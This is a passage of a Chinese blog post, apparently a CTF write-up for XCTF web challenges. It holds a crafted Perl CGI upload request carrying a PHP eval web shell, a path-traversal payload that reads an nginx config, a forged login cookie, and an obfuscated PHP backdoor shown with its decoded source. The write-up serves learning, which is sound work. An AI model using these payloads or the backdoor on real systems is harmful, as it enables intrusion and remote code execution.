<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict; <span class="comment"># 函数前言 </span></span><br><span class="line"><span class="keyword">use</span> warnings; </span><br><span class="line"><span class="keyword">use</span> CGI; <span class="comment"># 使用CGI模块</span></span><br><span class="line"><span class="keyword">my</span> $cgi= CGI-&gt;new; <span class="comment">#声明一个CGI模块</span></span><br><span class="line"><span class="keyword">if</span> ( $cgi-&gt;upload( <span class="string">&#x27;file&#x27;</span> ) )  <span class="comment"># CGI模块文件上传</span></span><br><span class="line">&#123; <span class="keyword">my</span> $file= $cgi-&gt;param( <span class="string">&#x27;file&#x27;</span> ); </span><br><span class="line"><span class="keyword">while</span> ( &lt;$file&gt; ) </span><br><span class="line">&#123; <span class="keyword">print</span> <span class="string">&quot;$_&quot;</span>; </span><br><span class="line">&#125; &#125; </span><br></pre></td></tr></table></figure>
<p>而perl文件上传存在一个漏洞，具体如下数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;file.pl?&#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: 111.200.241.244:36015</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;111.200.241.244:36015&#x2F;cgi-bin&#x2F;file.pl?&#x2F;flag</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------274822664121284</span><br><span class="line">Content-Length: 473</span><br><span class="line"></span><br><span class="line">-----------------------------274822664121284</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">ARGV</span><br><span class="line">-----------------------------274822664121284</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[cmd]);?&gt;</span><br><span class="line">-----------------------------274822664121284</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Submit!&quot;</span><br><span class="line"></span><br><span class="line">Submit!</span><br><span class="line">-----------------------------274822664121284--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意到第一个上传文件缺少filename，这时服务器会把文件的内容（即ARGV）当做文件名（即原本的filename），而输出的文件内容为空</p>
<p>而ARGV是perl中全局特殊文件句柄（其实是内置的array变量）。具体来说，perl命令行参数列表放入ARGV中，perl会将他们作为文件进行读取。</p>
<p>ARGV文件句柄会将@ARGV中的数组存放的每一个命令行参数作为文件名，输出文件内容</p>
<p>如何传入命令行参数，在url中直接传参，即等于命令行传参</p>
<p>而bash -c的语法是，后面的第一个参数会被当做命令解析，第二、三个会当做bash的参数</p>
<p>最后的“|”操作符，是管道</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;1c465fbb33ae45724600d69fe0cc5b5d&#125;</span><br></pre></td></tr></table></figure>
<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><h1 id="web-php-wrong-nginx-config（未做完）"><a href="#web-php-wrong-nginx-config（未做完）" class="headerlink" title="web_php_wrong_nginx_config（未做完）"></a>web_php_wrong_nginx_config（未做完）</h1><p>来源：XCTF</p>
<p>考察：</p>
<p>dirmap.py扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][15.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][15.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;?&#x2F;login</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][73.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;admin.php</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][15.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;index.php</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.73kb] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;login.php</span><br><span class="line">[200][text&#x2F;plain][42.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;robots.txt</span><br></pre></td></tr></table></figure>


<p>访问robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *Disallow:</span><br><span class="line"></span><br><span class="line">hint.php</span><br><span class="line">Hack.php</span><br></pre></td></tr></table></figure>
<p>hint.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">配置文件也许有问题呀：&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf</span><br></pre></td></tr></table></figure>
<p>抓包，发现cookie为isLogin=0</p>
<p>修改包为isLogin=1后，访问/admin/admin.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;admin&#x2F;admin.php?file&#x3D;index&amp;ext&#x3D;php HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>有file变量，猜想文件包含</p>
<p>结合“配置文件有问题”，访问该文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf&amp;ext&#x3D;</span><br></pre></td></tr></table></figure>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8080</span>; <span class="comment">## listen for ipv4; this line is default and implied</span></span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">8080</span>; <span class="comment">## listen for ipv6</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line">    <span class="attribute">port_in_redirect</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make site accessible from http://localhost/</span></span><br><span class="line">    <span class="comment">#server_name localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If block for setting the time for the logfile</span></span><br><span class="line">    if ($time_iso8601 ~ &quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;) &#123;</span><br><span class="line">       <span class="attribute">set</span> $year <span class="variable">$1</span>;</span><br><span class="line">       <span class="attribute">set</span> $month <span class="variable">$2</span>;</span><br><span class="line">       <span class="attribute">set</span> $day <span class="variable">$3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">set</span> $http_x_forwarded_for_filt $http_x_forwarded_for;</span><br><span class="line">        <span class="attribute">if</span> ($http_x_forwarded_for_filt <span class="regexp">~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+)</span> &#123;</span><br><span class="line">                <span class="attribute">set</span> $http_x_forwarded_for_filt <span class="variable">$1</span>???;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add stdout logging</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;</span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/error.log <span class="literal">info</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">        <span class="comment"># as directory, then fall back to index.html</span></span><br><span class="line">        <span class="attribute">try_files</span> $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class="line">        <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#error_page 404 /404.html;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line">    <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">try_files</span> $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/var/run/php/php5.6-fpm.sock;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_NAME $fastcgi_script_name;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> REMOTE_ADDR $http_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ /\.</span> &#123;</span><br><span class="line">            <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">            <span class="attribute">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /web-img &#123;</span><br><span class="line">        <span class="attribute">alias</span> /images/;</span><br><span class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~* \.(ini|docx|pcapng|doc)$</span> &#123;  </span><br><span class="line">         <span class="attribute">deny</span> all;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /var/www/nginx[.]conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$U&#x3D;&#39;_&#x2F;|U&quot;,&quot;&#x2F;-&#x2F;|U&quot;),ar|Uray|U(&quot;&#x2F;|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U&#x3D;o|Ub_get_|Ucontents(|U);|Uob_end_cle&#39;;</span><br><span class="line">$q&#x3D;&#39;s[|U$i]&#x3D;&quot;&quot;;$p&#x3D;|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].&#x3D;|U$p|U;|U$e&#x3D;|Ustrpos($s[$i],$f);|Ui&#39;;</span><br><span class="line">$M&#x3D;&#39;l&#x3D;&quot;strtolower|U&quot;;$i&#x3D;$m|U[1|U][0].$m[1]|U[1];$|U|Uh&#x3D;$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f&#x3D;$s|Ul($ss(|Umd5($i.$&#39;;</span><br><span class="line">$z&#x3D;&#39;r&#x3D;@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua&#x3D;@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u&#x3D;parse_|Uurl($r&#39;;</span><br><span class="line">$k&#x3D;&#39;?:;q&#x3D;0.([\\|Ud]))?,|U?&#x2F;&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s&#x3D;&amp;$_SESSIO|UN;$ss&#x3D;&quot;|Usubst|Ur&quot;;|U|U$s&#39;;</span><br><span class="line">$o&#x3D;&#39;|U$l;|U)&#123;for|U($j&#x3D;0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.&#x3D;$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r&#x3D;$|U_SERV|UE|UR;$r&#39;;</span><br><span class="line">$N&#x3D;&#39;|Uf($e)&#123;$k&#x3D;$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;&#x2F;&#39;;</span><br><span class="line">$C&#x3D;&#39;an();$d&#x3D;b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;&#x2F;$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#39;;</span><br><span class="line">$j&#x3D;&#39;$k|Uh&#x3D;&quot;|U|U42f7&quot;;$kf&#x3D;&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U&#x3D;|Ustrlen($k);$l&#x3D;s|Utrl|Ue|Un($t);$o&#x3D;|U&quot;&quot;;fo|Ur($i&#x3D;0;$i&lt;&#39;;</span><br><span class="line">$R&#x3D;str_replace(&#39;rO&#39;,&#39;&#39;,&#39;rOcreatrOe_rOrOfurOncrOtion&#39;);</span><br><span class="line">$J&#x3D;&#39;kf|U),|U0,3));$p&#x3D;&quot;|U&quot;;for(|U|U$|Uz&#x3D;1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.&#x3D;|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U&#x3D;&#x3D;&#x3D;0)&#123;$&#39;;</span><br><span class="line">$x&#x3D;&#39;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq&#x3D;array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;&#x2F;([\\|U|Uw])[|U\\w-]+|U(&#39;;</span><br><span class="line">$f&#x3D;str_replace(&#39;|U&#39;,&#39;&#39;,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);</span><br><span class="line">echo($f);</span><br><span class="line"># $g&#x3D;create_function(&#39;&#39;,$f);</span><br><span class="line"># $g();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;42f7&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;e9ac&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;<span class="variable">$c</span>=strlen(<span class="variable">$k</span>);<span class="variable">$l</span>=strlen(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;<span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;&#125;&#125;<span class="keyword">return</span> <span class="variable">$o</span>;&#125;<span class="variable">$r</span>=<span class="variable">$_SERVER</span>;<span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];<span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>)&#123;<span class="variable">$u</span>=parse_url(<span class="variable">$rr</span>);parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>);<span class="variable">$q</span>=array_values(<span class="variable">$q</span>);preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);<span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>)&#123;@session_start();<span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;<span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;<span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;<span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];<span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;count(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)<span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];<span class="keyword">if</span>(strpos(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>)&#123;<span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;<span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);&#125;<span class="keyword">if</span>(array_key_exists(<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;<span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;<span class="variable">$e</span>=strpos(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);<span class="keyword">if</span>(<span class="variable">$e</span>)&#123;<span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>;ob_start();@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));<span class="variable">$o</span>=ob_get_contents();ob_end_clean();<span class="variable">$d</span>=base64_encode(x(gzcompress(<span class="variable">$o</span>),<span class="variable">$k</span>));<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);@session_destroy();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>后面抄都抄不会了，放弃</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/" data-id="ckloj8nw70007vcus9dh1guzr" data-title="CTF-wp-攻防世界web高级" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" rel="tag">论文学习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 13.33px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 16.67px;">基础课</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">论文学习</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/24/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E6%B8%85%E5%8D%8EOS/">基础课-清华OS</a>
          </li>
        
          <li>
            <a href="/2021/03/16/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-%E6%96%B9%E6%B3%95%E8%AE%BA/">论文学习-方法论</a>
          </li>
        
          <li>
            <a href="/2021/03/15/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-2020-S-P-A-A-Stealthier-Partitioning-Attack-against-Bitcoin-Peer-to-Peer-Network/">论文学习-2020-S-P-A-A Stealthier Partitioning Attack against Bitcoin Peer-to-Peer Network</a>
          </li>
        
          <li>
            <a href="/2021/03/15/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-2020-S-P-A-Security-Analysis-of-the-Facebook-Ad-Library/">论文学习-2020-S-P-A Security Analysis of the Facebook Ad Library</a>
          </li>
        
          <li>
            <a href="/2021/03/13/CTF-wp-NahamCon2021/">CTF-wp-NahamCon2021</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>